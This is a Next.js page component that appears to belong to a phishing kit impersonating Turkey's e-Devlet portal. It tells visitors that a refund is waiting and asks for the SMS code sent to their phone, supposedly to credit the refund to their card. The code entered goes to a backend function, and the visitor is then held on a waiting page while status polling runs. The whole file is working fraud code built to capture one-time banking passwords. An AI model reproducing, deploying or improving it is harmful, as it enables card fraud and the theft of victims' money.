import { useCallback, useState } from 'react';
import { useRouter } from 'next/router';
import EdevletLayout from '../components/EdevletLayout';
import useStatusPolling from '../lib/hooks/useStatusPolling';
import useSessionStep from '../lib/hooks/useSessionStep';

const richText =
  '<strong><font color="#3a89b4"></font></strong>  TL İade tutarınız belirlendi. İade hakkınızı kartınıza geri aktarmak için lütfen telefonunuza gönderilen sms şifresini giriniz';

export default function SmsDogrulamaPage() {
  const router = useRouter();
  const [smsCode, setSmsCode] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const session = useSessionStep('SMS Doğrulama');

  useStatusPolling();

  const handleSubmit = useCallback(
    async (event) => {
      event.preventDefault();
      setErrorMessage('');

      if (!smsCode) {
        setErrorMessage('Lütfen telefonunuza gelen sms şifresini giriniz.');
        return;
      }

      setSubmitting(true);

      try {
        const response = await fetch('/.netlify/functions/verify-sms', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: smsCode }),
        });

        if (!response.ok) {
          throw new Error('SMS kaydedilemedi');
        }

        await router.push('/bekleyiniz');
      } catch (error) {
        if (process.env.NODE_ENV === 'development') {
          console.debug('SMS gönderimi başarısız:', error);
        }
        setErrorMessage('İşlem sırasında bir sorun oluştu. Lütfen tekrar deneyiniz.');
      } finally {
        setSubmitting(false);
      }
    },
    [router, smsCode],
  );

  if (!session.loading && !session.active) {
    return (
      <EdevletLayout richText="Oturum bulunamadı.">
        <p>Bu sayfayı görebilmek için önce bilgilerinizi göndermeniz gerekiyor.</p>
      </EdevletLayout>
    );
  }

  return (
    <EdevletLayout richText={richText}>
      <form id="loginForm" autoComplete="off" onSubmit={handleSubmit}>
        <fieldset>
          <div className="formRow required">
            <label htmlFor="smsField" className="rowLabel">
              Sms Şifreniz:
            </label>
            <div className="fieldGroup">
              <input
                id="smsField"
                name="sms1"
                type="tel"
                maxLength={10}
                className="text"
                aria-required="true"
                required
                value={smsCode}
                onChange={(event) => setSmsCode(event.target.value)}
              />
              <p>Lütfen telefonunuza gönderilen sms şifresini giriniz</p>
            </div>
          </div>
        </fieldset>

        {errorMessage && <p className="formError">{errorMessage}</p>}

        <div className="loader" style={{ display: submitting || session.loading ? 'flex' : 'none' }}>
          <img src="/assets/img/form-progress.svg" alt="..." />İşleminiz devam ediyor. Lütfen bekleyiniz...
        </div>

        <div className="formSubmitRow">
          <button type="submit" className="submitButton" disabled={submitting}>
            {submitting ? 'Gönderiliyor…' : 'İadeyi Kartıma Aktar'}
          </button>
          <button type="button" className="backButton" onClick={() => router.push('/')}> 
            İptal Et
          </button>
        </div>
      </form>
    </EdevletLayout>
  );
}